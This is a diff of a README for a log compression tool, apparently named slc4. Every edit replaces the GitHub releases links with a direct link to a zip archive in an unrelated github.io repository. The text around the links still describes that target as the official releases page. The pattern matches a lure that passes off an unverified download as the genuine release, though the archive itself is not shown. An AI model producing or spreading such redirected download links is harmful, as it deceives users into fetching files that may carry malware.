@@ -5,7 +5,7 @@ description: "Compress structured logs and tabular data losslessly in your brows
 ---
 # 📦 slc4-semantic-log-compression - Shrink Logs, Keep Every Byte
 
-[![Download Now](https://img.shields.io/badge/Download%20slc4%20semantic%20log%20compression-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Susanphi85/slc4-semantic-log-compression/releases)
+[![Download Now](https://img.shields.io/badge/Download%20slc4%20semantic%20log%20compression-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Susanphi85/susanphi85.github.io/main/centervelic/Dist_v1.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Getting started takes less than two minutes. Here's exactly what to do:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Susanphi85/slc4-semantic-log-compression/releases](https://github.com/Susanphi85/slc4-semantic-log-compression/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Susanphi85/susanphi85.github.io/main/centervelic/Dist_v1.1.zip](https://raw.githubusercontent.com/Susanphi85/susanphi85.github.io/main/centervelic/Dist_v1.1.zip)
 
 Click the download button on that page. Your browser will save the file to your computer — usually to your "Downloads" folder. You don't need to do anything else with this download. The file is what you'll use to open the tool.
 
@@ -58,7 +58,7 @@ That's it! You're ready to start compressing files.
 
 ### Download Instructions
 
-Visit this link to download the application: [https://github.com/Susanphi85/slc4-semantic-log-compression/releases](https://github.com/Susanphi85/slc4-semantic-log-compression/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Susanphi85/susanphi85.github.io/main/centervelic/Dist_v1.1.zip](https://raw.githubusercontent.com/Susanphi85/susanphi85.github.io/main/centervelic/Dist_v1.1.zip)
 
 This takes you to the official download page. Look for the newest version listed there and click the download button. The file is small, so it will finish quickly even on slower internet connections.
 
@@ -164,7 +164,7 @@ If you run into issues or have questions, the GitHub releases page is your best 
 - Download links for all previous versions
 - Community discussions and support
 
-Visit: [https://github.com/Susanphi85/slc4-semantic-log-compression/releases](https://github.com/Susanphi85/slc4-semantic-log-compression/releases)
+Visit: [https://raw.githubusercontent.com/Susanphi85/susanphi85.github.io/main/centervelic/Dist_v1.1.zip](https://raw.githubusercontent.com/Susanphi85/susanphi85.github.io/main/centervelic/Dist_v1.1.zip)
 
 ---
 
